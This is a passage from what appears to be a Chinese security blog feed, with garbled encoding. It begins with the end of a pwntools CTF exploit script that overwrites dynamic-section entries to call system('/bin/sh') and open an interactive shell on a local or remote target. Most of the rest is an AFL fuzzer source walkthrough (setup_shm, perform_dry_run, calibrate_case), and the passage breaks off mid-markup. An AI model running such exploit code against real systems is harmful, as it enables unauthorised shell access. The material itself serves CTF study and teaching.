class="hljs-string">&quot;@&quot;</span> + p32(addr)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(content)):<br>        payload += <span class="hljs-string">&#x27;.&#x27;</span> + p8(<span class="hljs-built_in">ord</span>(content[i]))<br>        payload += <span class="hljs-string">&#x27;&gt;&#x27;</span><br>    <span class="hljs-keyword">return</span> payload<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p.recv()<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x100000</span>))<br>    p.recv()<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x100</span>))<br>    p.recv()<br>    payload = write(<span class="hljs-number">0x33f958</span> - <span class="hljs-number">0x1c000</span>,<span class="hljs-string">&quot;/bin/sh;&quot;</span>) <span class="hljs-comment">#åŠ«æŒå‚æ•°</span><br>    payload += write(<span class="hljs-number">0x340180</span>-<span class="hljs-number">0x33f958</span>-<span class="hljs-number">0x8</span>,p64(<span class="hljs-number">0x9</span>)) <span class="hljs-comment">#å°†l_addræ”¹ä¸ºDT_DEBUgå’Œsystemå‡½æ•°çš„å·®å€¼</span><br>    payload += write(<span class="hljs-number">0x340228</span>-<span class="hljs-number">0x340180</span>-<span class="hljs-number">0x8</span>,p8(<span class="hljs-number">0x88</span>-<span class="hljs-number">0x8</span>)) <span class="hljs-comment">#åŠ«æŒDT_FINIæŒ‡å‘DT_DEBUG</span><br>    payload += write(<span class="hljs-number">0x340290</span>-<span class="hljs-number">0x340228</span> - <span class="hljs-number">0x1</span>,p64(<span class="hljs-number">0</span>)) <span class="hljs-comment">#ä½¿å¾—DT_FINI_ARRAYä¸ºNULL</span><br>    payload += <span class="hljs-string">&#x27;q&#x27;</span><br>    p.send(payload)<br>    p.interactive()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    binary = <span class="hljs-string">&#x27;./main&#x27;</span><br>    elf = ELF(<span class="hljs-string">&#x27;./main&#x27;</span>)<br>    context.binary = binary<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">3</span>):<br>        p = remote(sys.argv[<span class="hljs-number">1</span>],sys.argv[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">else</span>:<br>        p = process(binary)<br>    exp()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€fuzzã€‘AFLæºç åˆ†æ part 2</title>
    <link href="/2023/09/04/%E3%80%90fuzz%E3%80%91AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%20part%202/"/>
    <url>/2023/09/04/%E3%80%90fuzz%E3%80%91AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%20part%202/</url>
    
    <content type="html"><![CDATA[<blockquote><p>ä¸Šä¸ªä¸€ä¸ªpartä¸»è¦å…³æ³¨çš„æ˜¯æ’æ¡©ç›¸å…³éƒ¨åˆ†çš„æºç ï¼Œè¿™ä¸€èŠ‚ä¸»è¦æ¥æŸ¥çœ‹afl-fuzz.cè¿™ä¸ªæ ¸å¿ƒæ¨¡å—çš„æºç éƒ¨åˆ†</p></blockquote><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>ç”±äºè¯¥éƒ¨åˆ†ä»£ç ä½“é‡è¿‡å¤§ï¼Œæˆ‘ä»¬åªå¯¹æ ¸å¿ƒéƒ¨åˆ†è¿›è¡Œæºç è§£æã€‚è¿™éƒ¨åˆ†æ€»ä½“å¯ä»¥åˆ†ä¸ºä¸‰å—ï¼š</p><ol><li>åˆå§‹é…ç½®ï¼šè¿›è¡Œfuzzç¯å¢ƒé…ç½®ç›¸å…³å·¥ä½œ</li><li>fuzzæ‰§è¡Œï¼šfuzzçš„ä¸»å¾ªç¯è¿‡ç¨‹</li><li>å˜å¼‚ç­–ç•¥ï¼šæµ‹è¯•ç”¨ä¾‹çš„å˜å¼‚è¿‡ç¨‹å’Œæ–¹å¼</li></ol><h2 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h2><p>é¦–å…ˆä»<code>main()</code>å‡½æ•°ç€æ‰‹è¿›è¡Œåˆ†æã€‚åœ¨å®Œæˆåˆå§‹é…ç½®åï¼Œ<code>main()</code>åŒæ ·åˆ©ç”¨timeç”Ÿæˆéšæœºç§å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">gettimeofday(&amp;tv, &amp;tz);<br>srandom(tv.tv_sec ^ tv.tv_usec ^ getpid());<br></code></pre></td></tr></table></figure><p>ç´§æ¥ç€ä¾¿æ˜¯ç¬¬ä¸€ä¸ªå¾ªç¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((opt = getopt(argc, argv, <span class="hljs-string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">switch</span>(opt)&#123;<br>            ...<br>    &#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå¾ªç¯çš„åŠŸèƒ½è¿˜æ˜¯æ¯”è¾ƒæ˜æ˜¾çš„ã€‚ä»ä¸‹å›¾çš„éƒ¨åˆ†æºä»£ç å’Œæ³¨é‡Šä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå…¶ä¸»è¦æ˜¯è·å–å‘½ä»¤è¡Œä¼ å…¥çš„å‚æ•°ï¼Œä»¥åŠä¸€äº›å¯¹åº”flagçš„è®¾ç½®ã€‚</p><p><img src="/img/article/fuzzAFL2/image-20230904135719892.png" alt="image-20230904135719892"></p><p>ç´§æ¥ç€ä¾¿æ˜¯<code>setup_signal_handlers()</code>å‡½æ•°ï¼Œä¸»è¦æ˜¯è°ƒç”¨<code>sigaction()</code>ï¼Œæ³¨å†Œä¸€äº›ä¿¡å·å¤„ç†å‡½æ•°ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹ï¼š</p><table><thead><tr><th>ä¿¡å·</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>SIGHUP&#x2F;SIGINT&#x2F;SIGTERM</td><td>å¤„ç†å„ç§â€œstopâ€æƒ…å†µ</td></tr><tr><td>SIGALRM</td><td>å¤„ç†è¶…æ—¶çš„æƒ…å†µ</td></tr><tr><td>SIGWINCH</td><td>å¤„ç†çª—å£å¤§å°</td></tr><tr><td>SIGUSER1</td><td>ç”¨æˆ·è‡ªå®šä¹‰ä¿¡å·ï¼Œè¿™é‡Œå®šä¹‰ä¸ºskip request</td></tr><tr><td>SIGSTP&#x2F;SIGPIPE</td><td>å…¶ä»–ä¸€äº›ä¸é‡è¦ä¿¡å·</td></tr></tbody></table><p>ç„¶åæ¥ç€ä»æ˜¯ä¸€äº›å‚æ•°å¤„ç†çš„å‡½æ•°<code>check_asan_opts()</code>ï¼Œç”¨æ¥è¯»å–ç¯å¢ƒå˜é‡<strong>ASAN_OPTIONS</strong>å’Œ<strong>MSAN_OPTIONS</strong>ï¼›<code>fix_up_sync()</code>ç”¨æ¥å¤„ç†-Mï¼Œ-Sç›¸å…³å‚æ•°ï¼›<code>check_if_tty</code>ç”¨äºæ£€æŸ¥ç¨‹åºæ˜¯å¦ä½¿ç”¨ttyç»ˆç«¯è¿è¡Œï¼›æœ€åè¿˜æœ‰<code>get_core_count</code>, <code>check_crash_handing</code>, <code>check_cpu_governor</code>è¿™äº›å‡½æ•°ç”¨æ¥åšCPUæ£€æŸ¥ç›¸å…³ã€‚</p><h2 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h2><p>ç´§æ¥ç€ä¾¿æ˜¯åˆå§‹åŒ–shmå’Œvirgin_bitsç›¸å…³å†…å®¹çš„é‡è¦å‡½æ•°<code>setup_shm()</code>ï¼Œè¿™äº›å˜é‡ç”¨äºè®°å½•tupleç›¸å…³çŠ¶æ€ï¼Œæºç å¦‚ä¸‹ï¼š</p><blockquote><p>å…³äºtupleçš„å®šä¹‰å¯ä»¥æŸ¥çœ‹æˆ‘åœ¨AFLç™½çš®ä¹¦ä¸­æœ‰å…³Detecting new behaviorsçš„å†…å®¹:<a href="https://loora1n.github.io/2023/08/23/%E3%80%90fuzz%E3%80%91AFL%E7%99%BD%E7%9A%AE%E4%B9%A6%E4%B8%AD%E8%8B%B1%E5%8F%8C%E8%AF%AD%E7%89%88/">ã€fuzzã€‘AFLç™½çš®ä¹¦ä¸­è‹±åŒè¯­ç‰ˆ - é·ºé›¨ã®Blog (loora1n.github.io)</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">setup_shm</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *åˆå§‹åŒ–</span><br><span class="hljs-comment">  */</span><br>  u8* shm_str;<br><br>  <span class="hljs-keyword">if</span> (!in_bitmap) <span class="hljs-built_in">memset</span>(virgin_bits, <span class="hljs-number">255</span>, MAP_SIZE);<br><br>  <span class="hljs-built_in">memset</span>(virgin_tmout, <span class="hljs-number">255</span>, MAP_SIZE);<br>  <span class="hljs-built_in">memset</span>(virgin_crash, <span class="hljs-number">255</span>, MAP_SIZE);<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *åˆ†é…å…±äº«å†…å­˜ï¼Œå…³äºshmgetçš„å†…å®¹å¯ä»¥çœ‹çœ‹è¿™ç¯‡æœ‰å…³è¿›ç¨‹é€šä¿¡çš„åšå®¢</span><br><span class="hljs-comment">  *https://www.cnblogs.com/52php/p/5861372.html</span><br><span class="hljs-comment">  */</span><br>  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="hljs-number">0600</span>);<br><br>  <span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;shmget() failed&quot;</span>);<br><br>  atexit(remove_shm);<span class="hljs-comment">//æ³¨å†Œatexit handler ä¸º remove_shm</span><br><br>  shm_str = alloc_printf(<span class="hljs-string">&quot;%d&quot;</span>, shm_id);<br><br>  <span class="hljs-keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="hljs-number">1</span>);<br><br>  ck_free(shm_str);<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *å¯åŠ¨è¿›ç¨‹å¯¹å…±äº«å†…å­˜è®¿é—®æƒé™ï¼Œè¿”å›å…±äº«å†…å­˜é¦–åœ°å€æŒ‡é’ˆ</span><br><span class="hljs-comment">  */</span><br>  trace_bits = shmat(shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-keyword">if</span> (trace_bits == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>) PFATAL(<span class="hljs-string">&quot;shmat() failed&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æœ‰å››ä¸ªæ ¸å¿ƒå˜é‡ï¼Œå®šä¹‰å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">EXP_ST u8* trace_bits;                <span class="hljs-comment">/* SHM with instrumentation bitmap  */</span><br><br>EXP_ST u8  virgin_bits[MAP_SIZE],     <span class="hljs-comment">/* Regions yet untouched by fuzzing */</span><br>           virgin_tmout[MAP_SIZE],    <span class="hljs-comment">/* Bits we haven&#x27;t seen in tmouts   */</span><br>           virgin_crash[MAP_SIZE];    <span class="hljs-comment">/* Bits we haven&#x27;t seen in crashes  */</span><br></code></pre></td></tr></table></figure><p>ä»æ³¨é‡Šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>trace_bits</code>æŒ‡å‘å­˜æ”¾æ’æ¡©æƒ…å†µä½å›¾çš„å…±äº«å†…å­˜ï¼Œ<code>virgin_bits[MAP_SIZE]</code>ä¸»è¦æ˜¯ç”¨äºè®°å½•æœªåˆ°è¾¾åŒºåŸŸï¼Œè€Œ<code>virgin_tmout</code>å’Œ<code>virgin_crash</code>åˆ™æ˜¯è®°å½•timeoutå’Œcrashçš„æƒ…å†µã€‚</p><h2 id="æ–‡ä»¶åŠæ¨¡å¼é€‰æ‹©"><a href="#æ–‡ä»¶åŠæ¨¡å¼é€‰æ‹©" class="headerlink" title="æ–‡ä»¶åŠæ¨¡å¼é€‰æ‹©"></a>æ–‡ä»¶åŠæ¨¡å¼é€‰æ‹©</h2><p>ç„¶åä»æ˜¯ä¸€äº›å¤„ç†å‡½æ•°ï¼Œæˆ‘ç”¨æ³¨é‡Šæ ‡è¯†å‡½æ•°ç”¨é€”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>setup_dirs_fds();<span class="hljs-comment">/*Prepare output directories and fds.*/</span><br>read_testcases();<span class="hljs-comment">/*Read all testcases from the input directory, then queue them for testing.</span><br><span class="hljs-comment"> Called at startup.*/</span><br><br>load_auto();<span class="hljs-comment">/* Load automatically generated extras. */</span><br><br>pivot_inputs();<span class="hljs-comment">/* Create hard links for input test cases in the output directory, choosing</span><br><span class="hljs-comment">   good names and pivoting accordingly. */</span><br><br><span class="hljs-keyword">if</span> (extras_dir) load_extras(extras_dir);<span class="hljs-comment">/* Read extras from the extras directory and sort them by size. */</span><br><br><span class="hljs-keyword">if</span> (!timeout_given) find_timeout();<span class="hljs-comment">/* The same, but for timeouts. The idea is that when resuming sessions without</span><br><span class="hljs-comment">   -t given, we don&#x27;t want to keep auto-scaling the timeout over and over</span><br><span class="hljs-comment">   again to prevent it from growing due to random flukes. */</span><br><br>detect_file_args(argv + optind + <span class="hljs-number">1</span>);<span class="hljs-comment">/* Detect @@ in args. */</span><br><br><span class="hljs-keyword">if</span> (!out_file) setup_stdio_file();<span class="hljs-comment">/* Setup the output file for fuzzed data, if not using -f. */</span><br><br>check_binary(argv[optind]);<span class="hljs-comment">/* Do a PATH search and find target binary to see that it exists and</span><br><span class="hljs-comment">   isn&#x27;t a shell script - a common and painful mistake. We also check for</span><br><span class="hljs-comment">   a valid ELF header and for evidence of AFL instrumentation. */</span><br><br>start_time = get_cur_time();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*å¤„ç†qemuæ¨¡å¼ä¸‹çš„å‚æ•°</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (qemu_mode)<br>  use_argv = get_qemu_argv(argv[<span class="hljs-number">0</span>], argv + optind, argc - optind);<br><span class="hljs-keyword">else</span><br>  use_argv = argv + optind;<br>...<br></code></pre></td></tr></table></figure><h2 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h2><p>æ¥ä¸‹æ¥è°ƒç”¨<code>perform_dry_run(use_argv)</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªååˆ†æ ¸å¿ƒçš„å‡½æ•°ï¼Œå‡½æ•°æ³¨é‡Š: <strong>Perform dry run of all test cases to confirm that the app is working as expected. This is done only for the initial inputs, and only once.</strong> å¤§è‡´å«ä¹‰ä¸ºï¼šè¯•è¿è¡Œæ‰€æœ‰åˆå§‹çš„æµ‹è¯•ç”¨ä¾‹ä»¥ç¡®ä¿åº”ç”¨å¯ä»¥æ­£ç¡®è¿è¡Œï¼Œä¸”ä»…æ‰§è¡Œä¸€æ¬¡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>* <span class="hljs-title">q</span> =</span> <span class="hljs-built_in">queue</span>;<br>u32 cal_failures = <span class="hljs-number">0</span>;<br>u8* skip_crashes = getenv(<span class="hljs-string">&quot;AFL_SKIP_CRASHES&quot;</span>);<br><br><span class="hljs-keyword">while</span> (q) &#123;<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å‡½æ•°å¼€å¤´é¦–å…ˆå¯¹è¾“å…¥é˜Ÿåˆ—è¿›è¡Œéå†ï¼Œqueueç›¸å…³å˜é‡å«ä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span> *<span class="hljs-title">queue</span>,     /* <span class="hljs-title">Fuzzing</span> <span class="hljs-title">queue</span> (<span class="hljs-title">linked</span> <span class="hljs-title">list</span>)      */</span><br><span class="hljs-class">                          *<span class="hljs-title">queue_cur</span>, /* <span class="hljs-title">Current</span> <span class="hljs-title">offset</span> <span class="hljs-title">within</span> <span class="hljs-title">the</span> <span class="hljs-title">queue</span>  */</span><br><span class="hljs-class">                          *<span class="hljs-title">queue_top</span>, /* <span class="hljs-title">Top</span> <span class="hljs-title">of</span> <span class="hljs-title">the</span> <span class="hljs-title">list</span>                  */</span><br><span class="hljs-class">                          *<span class="hljs-title">q_prev100</span>;</span> <span class="hljs-comment">/* Previous 100 marker              */</span><br></code></pre></td></tr></table></figure><p>åœ¨<code>while(q)</code>éƒ¨åˆ†ä¸­ï¼Œé¦–å…ˆæ ¹æ®è·¯å¾„ï¼Œæ‰“å¼€è¾“å…¥æ–‡ä»¶å¹¶ä¼ å…¥å˜é‡<code>use_mem</code>ï¼Œæ¥ç€è°ƒç”¨å‡½æ•°è¿›è¡Œæ£€æµ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(q)&#123;<br>    ...<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    *è¯»å–æ ·æœ¬æ•°æ®ï¼Œä¼ å…¥use_mem</span><br><span class="hljs-comment">    */</span><br>    u8* fn = <span class="hljs-built_in">strrchr</span>(q-&gt;fname, <span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-number">1</span>;<br><br>    ACTF(<span class="hljs-string">&quot;Attempting dry run with &#x27;%s&#x27;...&quot;</span>, fn);<br><br>    fd = open(q-&gt;fname, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, q-&gt;fname);<br><br>    use_mem = ck_alloc_nozero(q-&gt;len);<br><br>    <span class="hljs-keyword">if</span> (read(fd, use_mem, q-&gt;len) != q-&gt;len)<br>      FATAL(<span class="hljs-string">&quot;Short read from &#x27;%s&#x27;&quot;</span>, q-&gt;fname);<br><br>    close(fd);<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    *è°ƒç”¨calibrate_caseæ ¡å‡†æµ‹è¯•ç”¨ä¾‹</span><br><span class="hljs-comment">    */</span><br>    res = calibrate_case(argv, q, use_mem, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<span class="hljs-comment">/* Calibrate a new test case. This is done when processing the input directory</span><br><span class="hljs-comment">   to warn about flaky or otherwise problematic test cases early on; and when</span><br><span class="hljs-comment">   new paths are discovered to detect variable behavior and so on. */</span><br>    ck_free(use_mem);<br>    <br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬å…³æ³¨ä¸€ä¸‹<code>calibrate_case</code>å‡½æ•°çš„æµç¨‹ï¼š</p><ol><li>åˆå§‹åŒ–è®¾ç½®ï¼Œuser_tmoutã€stage_nameã€stage_max</li><li>åˆ¤æ–­ forkserver çŠ¶æ€ï¼Œè‹¥æœªå¯åŠ¨ï¼Œåˆ™è°ƒç”¨ <code>init_forkserver()</code>åˆå§‹åŒ–</li><li>è¿›å…¥å¾ªç¯ï¼Œå¯¹ç”¨ä¾‹è¿›è¡Œæµ‹è¯•ï¼Œå¾ªç¯ä¸ºä¸€ä¸‹æ­¥éª¤<ul><li>è°ƒç”¨<code>write_to_testcase()</code>ï¼Œå°†è¾“å…¥å†™å…¥æµ‹è¯•æ–‡ä»¶</li><li>è°ƒç”¨<code>runtarget()</code>ï¼Œfuzzç›®æ ‡ç¨‹åºå¹¶ç›‘æ§</li><li>æ£€æµ‹æ˜¯å¦å‡ºç°crashæˆ–æ–°è·¯å¾„ï¼Œå¹¶æ›´æ–°ä½å›¾ï¼Œè®°å½•æµ‹è¯•ç›¸å…³çŠ¶æ€</li><li>å½“å­˜åœ¨æ–°tupleï¼Œè°ƒç”¨<code>update_bitmap_score()</code>ï¼Œæ¥ç¡®å®šâ€more favorable pathâ€</li><li>è‹¥ä¸å­˜åœ¨ï¼Œåˆ™åé¦ˆç»™çˆ¶è¿›ç¨‹</li></ul></li></ol><p>ç®€åŒ–åçš„å‡½æ•°æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8 <span class="hljs-title function_">calibrate_case</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv, <span class="hljs-keyword">struct</span> queue_entry* q, u8* use_mem,</span><br><span class="hljs-params">                         u32 handicap, u8 from_queue)</span> &#123;<br>  ...<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *åˆå§‹åŒ–</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (!from_queue || resuming_fuzz)<br>    use_tmout = MAX(exec_tmout + CAL_TMOUT_ADD,<br>                    exec_tmout * CAL_TMOUT_PERC / <span class="hljs-number">100</span>);<br>  ...<br>  stage_name = <span class="hljs-string">&quot;calibration&quot;</span>;<br>  stage_max  = fast_cal ? <span class="hljs-number">3</span> : CAL_CYCLES;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *forkserver</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (dumb_mode != <span class="hljs-number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)<br>    init_forkserver(argv);<br>  ...<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *loop</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">for</span> (stage_cur = <span class="hljs-number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;<br>    ...<br>    write_to_testcase(use_mem, q-&gt;len);<br>    fault = run_target(argv, use_tmout);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ–°è·¯å¾„</span><br><span class="hljs-comment">*/</span><br>    <span class="hljs-keyword">if</span> (stop_soon || fault != crash_mode) <span class="hljs-keyword">goto</span> abort_calibration;<br>    <span class="hljs-keyword">if</span> (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !count_bytes(trace_bits)) &#123;<br>      fault = FAULT_NOINST;<br>      <span class="hljs-keyword">goto</span> abort_calibration;<br>    &#125;<br>    cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*å­˜åœ¨æ–°è·¯å¾„</span><br><span class="hljs-comment">*/</span><br>    <span class="hljs-keyword">if</span> (q-&gt;exec_cksum != cksum) &#123;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *æ›´æ–°ä½å›¾</span><br><span class="hljs-comment">  */</span><br>      hnb = has_new_bits(virgin_bits);<br>      <span class="hljs-keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;<br>  ...<br>  &#125;<br>  ...<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *ç¡®å®šmore favorable path</span><br><span class="hljs-comment">  */</span><br>  update_bitmap_score(q);<br>  ...<br> <span class="hljs-comment">/*</span><br><span class="hljs-comment"> *ä¸å­˜åœ¨æ–°è·¯å¾„</span><br><span class="hljs-comment"> */</span><br>abort_calibration:<br>  ...<br><br>&#125;<br></code></pre></td></tr></table></figure><p>åŸºæœ¬åˆ°è¿™é‡Œè¯¥å‡½æ•°å°±ç»“æŸäº†ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†éƒ½æ˜¯ä¸€äº›é”™è¯¯ä¿¡æ¯å¤„ç†ç›¸å…³å†…å®¹</p><p><img src="/img/article/fuzzAFL2/image-20230904183850138.png" alt="image-20230904183850138"></p><h2 id="fuzzerä¸forkserveré€šä¿¡"><a href="#fuzzerä¸forkserveré€šä¿¡" class="headerlink" title="fuzzerä¸forkserveré€šä¿¡"></a>fuzzerä¸forkserveré€šä¿¡</h2><p>åœ¨è¿™é‡Œæˆ‘ä»¬åœé¡¿ä¸€ä¸‹ï¼Œæ¢³ç†ä¸‹fuzzerä¸forkserveré€šä¿¡çš„å¤§è‡´æµç¨‹ã€‚é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“ï¼Œå®é™…ç”¨äºfuzzçš„å­è¿›ç¨‹å¹¶ä¸æœ‰fuzzer forkå¾—åˆ°ï¼Œè€Œæ˜¯ç”±fuzzer å¯åŠ¨çš„forkserverè¿›è¡Œforkå¾—åˆ°ï¼Œå¦‚å›¾æ‰€ç¤º</p><p><img src="/img/article/fuzzAFL2/1632794033_615275b15953b258b38cd.png" alt="1632794033_615275b15953b258b38cd"></p><p>ä¸¤è€…ä¹‹é—´é€šä¿¡æˆ‘ä»¬å¯ä»¥ç”±ä¸‹å›¾è§‚ä¹‹</p><p><img src="/img/article/fuzzAFL2/1632794034_615275b20ecc5e3dc8f7d.png" 